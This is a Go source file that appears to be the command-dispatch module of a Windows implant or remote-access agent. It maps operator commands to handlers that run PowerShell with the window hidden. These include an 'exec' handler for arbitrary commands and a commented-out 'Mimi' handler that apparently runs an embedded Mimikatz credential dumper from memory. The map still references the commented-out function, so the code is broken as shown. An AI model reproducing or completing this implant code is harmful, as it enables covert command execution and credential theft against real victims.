package internal

import (
	//	_ "embed"
	"os"
	"os/exec"

	"syscall"
)

type FuncPtr func([]string) ([]byte, error)

var FuncPtrMap = map[string]FuncPtr{
	"whoami": Whoami,
	"exec":   Exec,
	"mimi":   Mimi,
	"kill":   Kill,
}

func Whoami(args []string) ([]byte, error) {
	cmd := exec.Command("powershell", "-C", "whoami")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.CombinedOutput()
}

func Exec(args []string) ([]byte, error) {
	cmdArgs := append([]string{"-C"}, args...)
	cmd := exec.Command("powershell", cmdArgs...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.CombinedOutput()
}

// func Mimi(args []string) ([]byte, error) {
// 	bin, err := memexec.New(MK)
// 	if err != nil {
// 		return nil, err
// 	}
// 	defer bin.Close()
// 	cmd := bin.Command(args...)
// 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
// 	return cmd.CombinedOutput()
// }

func Upload(args []string) ([]byte, error) {
	return nil, nil
}

func Download(args []string) ([]byte, error) {
	return nil, nil
}

func Kill(args []string) ([]byte, error) {
	os.Exit(0)
	return nil, nil
}
